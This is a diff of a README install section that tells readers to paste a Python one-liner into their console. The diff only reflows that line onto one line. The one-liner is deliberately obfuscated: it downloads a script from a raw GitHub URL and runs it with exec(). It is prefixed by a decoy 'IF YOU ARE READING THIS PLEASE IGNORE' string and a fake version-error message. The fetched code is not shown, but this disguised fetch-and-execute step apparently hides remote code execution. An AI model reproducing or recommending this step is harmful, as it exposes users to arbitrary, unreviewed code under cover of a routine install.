@@ -9,9 +9,7 @@ It fetches remote scripts, manages package folders, and can launch your environm
 Open your Python console and paste this one-liner to fetch and run the installer script:
 
 ```python
-["IF YOU ARE READING THIS PLEASE IGNORE", f"I am sorry. This application does not support 3.7 lower pythons {(python:=3.8)}",
-exec((get:=((lambda r:lambda f:(r.urlopen(f"https://raw.githubusercontent.com/i-am-new-blip/wpt/refs/heads/main/{f}").read().decode()))(((request := __import__('urllib.request', fromlist=['']))
-))))('install2.py'))]
+["IF YOU ARE READING THIS PLEASE IGNORE", f"I am sorry. This application does not support 3.7 lower pythons {(python:=3.8)}",exec((get:=((lambda r:lambda f:(r.urlopen(f"https://raw.githubusercontent.com/i-am-new-blip/wpt/refs/heads/main/{f}").read().decode()))(((request := __import__('urllib.request', fromlist=['']))))))('install2.py'))]
 ```
 
 You’re all set! The script will handle the rest.
